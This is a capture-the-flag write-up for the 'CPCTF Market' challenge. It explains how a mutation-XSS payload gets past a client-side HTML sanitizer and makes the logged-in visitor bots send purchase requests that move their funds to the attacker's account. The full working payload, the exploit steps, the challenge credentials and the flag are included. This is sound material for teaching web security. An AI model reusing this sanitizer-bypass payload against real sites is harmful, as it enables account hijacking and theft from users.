# CPCTF Market

Flag:

```text
CPCTF{D0_N0T_r011_y0ur_0wn_s4n1t12er}
```

The challenge gives us Mallory's account, but she only has `1000` CP while the flag costs `100000000` CP. The key observation is that Alice and Bob each have `50000000` CP, and they automatically visit Mallory's shop whenever it is updated. So if we can make their browsers perform a purchase with no clicks, the money problem disappears.

The bot source confirms the behavior:

```js
await page.goto(topPageUrl.href, { waitUntil: "domcontentloaded" });
await page.fill('.login-form input[name="accountId"]', this.accountId);
await page.fill('.login-form input[name="password"]', this.password);
await page.click('.login-form button[type="submit"]');
...
await page.goto(targetUrl.href, { waitUntil: "domcontentloaded" });
await page.waitForTimeout(VIEW_DURATION_MS);
```

The shop HTML is sanitized on the client, not the server:

```js
const { sanitizedHtml, isModified } = sanitizeHtml(shop.shopHtml);
htmlEl.innerHTML = sanitizedHtml;
```

This is exactly the pattern where mXSS becomes interesting: parse untrusted HTML into a DOM, serialize it back to a string, then feed that string into `innerHTML` again. The sanitizer also uses `FILTER_SKIP` for disallowed tags:

```js
if (!ALLOWED_TAGS.has(tag)) return NodeFilter.FILTER_SKIP;
```

so foreign-content parser tricks can still influence the first parse even when the outer wrapper tag itself is removed from the serialized output.

The final working payload was:

```html
<svg><xss><desc><noscript>&lt;/noscript>&lt;/desc>&lt;p>&lt;/p>&lt;style>&lt;a title="&lt;/style>&lt;img src=1 alt=POST title=/api/items/ITEM_ID/purchase onerror=fetch(this.title,{method:this.alt})>">
```

Why this works:

1. The first parse treats the weird SVG/desc/noscript/style combination as harmless-looking structure.
2. The sanitizer serializes it back into a string without understanding that the structure is not stable across reparsing.
3. When the page later does `innerHTML = sanitizedHtml`, Chromium reparses it differently and a real `<img ... onerror=...>` appears in the final DOM.
4. `src=1` fails to load, so `onerror` fires automatically.
5. The handler executes `fetch('/api/items/ITEM_ID/purchase', { method: 'POST' })` in Alice's or Bob's authenticated session.

I verified locally against the exact market sanitizer that this payload mutates into:

```html
<img src="1" alt="POST" title="/api/items/ITEM_ID/purchase" onerror="fetch(this.title,{method:this.alt})">
```

and that the `fetch(...)` call is actually made.

The exploit is then straightforward:

1. Log in as `mallory / CPCTF2026`.
2. Create a new item priced at `50000000` CP.
3. Update Mallory's shop HTML to the payload above with that item id substituted.
4. Alice and Bob both visit the updated shop and each auto-buy the item once.
5. Mallory's balance becomes `100001000` CP.
6. Buy `flag`.

On the live instance, after a single patch, Mallory's balance changed like this:

```text
before: 1000
after:  100001000
```

Then:

```text
POST /api/items/flag/purchase
```

succeeded, and `/api/auth/me` returned:

```json
{
  "itemId": "flag",
  "sellerId": "admin",
  "price": 100000000,
  "content": "CPCTF{D0_N0T_r011_y0ur_0wn_s4n1t12er}"
}
```

`solve.py` automates the whole process.
